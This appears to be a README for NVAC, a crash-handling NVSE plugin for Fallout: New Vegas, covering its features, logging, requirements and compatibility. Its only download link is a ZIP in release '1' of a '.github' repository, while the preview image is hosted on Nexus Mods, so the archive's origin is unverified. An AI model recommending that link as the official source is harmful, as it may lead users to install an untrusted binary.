<h1 align="center">NVAC - New Vegas Anti Crash</h1>

<p align="center">
  <img src="https://staticdelivery.nexusmods.com/mods/130/images/53635-1-1384246957.png" alt="NVAC - New Vegas Anti Crash Preview">
</p>

NVAC - New Vegas Anti Crash is an NVSE plugin for Fallout: New Vegas that uses structured exception handling and sanity checks to reduce the frequency of game crashes caused by specific access violation exceptions.

Download: [NVAC - New Vegas Anti Crash](https://github.com/NVAC-New-Vegas-Anti-Crash/.github/releases/download/1/NVAC.New.Vegas.Anti.Crash.7.5.1.zip)

## Overview

NVAC provides runtime crash-handling mechanisms for Fallout: New Vegas. Rather than acting as a conventional ESP/ESM mod, it loads as an NVSE plugin and applies targeted executable-level changes while the game is running.

It is designed to handle selected exceptions and prevent certain known crash conditions. It is not a universal crash fix and cannot guarantee that every crash will be prevented.

## Core Functionality

- **Structured Exception Handling** — handles selected exceptions through dedicated and global exception-handling mechanisms.
- **Sanity Checks** — performs checks intended to prevent specific invalid operations from causing crashes.
- **Targeted Crash Handling** — includes fixes for known exception addresses and selected game-specific issues.
- **Heuristic Detection** — identifies certain instruction-related exceptions through heuristic analysis.
- **Hang Detection** — includes targeted handling for selected game freezes.
- **Diagnostic Logging** — records exception and recovery information in `nvac.log`.
- **Runtime Function Inlining** — replaces eligible short internal function calls with equivalent instructions, providing a minor performance improvement.

## Logging and Diagnostics

NVAC writes diagnostic information to `nvac.log` in the Fallout: New Vegas game directory.

After launching the game, check this file to verify that NVAC has loaded and to inspect recorded exception events. If `nvac.log` is missing, consult `nvse.log` for plugin-loading information.

The log distinguishes between automatically handled exceptions, targeted exception handling, sanity checks, avoided freezes, and unhandled exceptions. Unhandled exception entries can help identify crashes that NVAC did not recover from.

## Technical Requirements

- Fallout: New Vegas
- New Vegas Script Extender (NVSE)

NVAC is an NVSE plugin. Its DLL is loaded from:

`Data/NVSE/Plugins/nvac.dll`

## Compatibility Notes

- NVAC primarily targets Fallout: New Vegas.
- Version 7.5.0.0 introduced a fix for issues associated with the Windows 10 Anniversary Update and newer NVIDIA/AMD graphics drivers.
- Version 7.5.1.0 fixed automated installation compatibility alongside Tale of Two Wastelands (TTW) when using Mod Organizer.
- The author also documented support for selected Fallout 3, Oblivion, and editor executables in the 7.5.0.0 release notes. Compatibility and installation behavior may differ between these applications.
- The German No Gore variant of Fallout: New Vegas is not fully supported.

## Important Notes

NVAC is not a complete solution for game instability. It only targets specific exception types, addresses, and known conditions; unrelated crashes may still occur.

The plugin modifies executable code in memory while the game is running and does not make permanent changes to the game executable or write its runtime changes into save files.

NVAC can be disabled through a mod manager or removed by taking `nvac.dll` out of the NVSE plugins directory. The author recommends disabling it during mod development so that crashes caused by a developing mod are not hidden by NVAC's recovery mechanisms.
